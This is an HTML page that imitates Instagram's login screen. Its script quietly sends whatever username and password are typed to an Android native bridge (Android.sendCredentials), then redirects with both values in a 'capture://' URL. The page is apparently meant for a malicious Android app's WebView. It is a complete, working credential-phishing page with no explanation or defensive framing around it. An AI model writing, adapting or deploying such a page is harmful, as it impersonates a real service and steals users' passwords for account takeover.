<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{background:white;padding:40px 35px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.1);width:100%;max-width:380px;text-align:center}
.logo{font-size:38px;color:#262626;margin-bottom:20px;font-weight:600}
input{width:100%;padding:12px 14px;margin:6px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px;outline:none}
input:focus{border-color:#a8a8a8;background:white}
button{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
button:hover{background:#0081d6}
button:disabled{opacity:0.7}
.error{color:#ed4956;font-size:13px;margin-top:10px;display:none}
</style>
</head>
<body>
<div class="container"><div class="logo">Instagram</div>
<form onsubmit="submitForm(event)">
<input type="text" id="user" placeholder="Username" required>
<input type="password" id="pass" placeholder="Password" required>
<button type="submit">Log In</button>
<div class="error" id="error">Please check your credentials</div>
</form></div>
<script>
function submitForm(e){e.preventDefault();var u=document.getElementById('user').value;var p=document.getElementById('pass').value;if(u.length<2||p.length<3){document.getElementById('error').style.display='block';return;}if(typeof Android!=='undefined'){Android.sendCredentials(u,p);}var btn=document.querySelector('button');btn.textContent='Logging in...';btn.disabled=true;setTimeout(function(){window.location.href='capture://?user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p);},1200);}
</script>
</body>
</html>
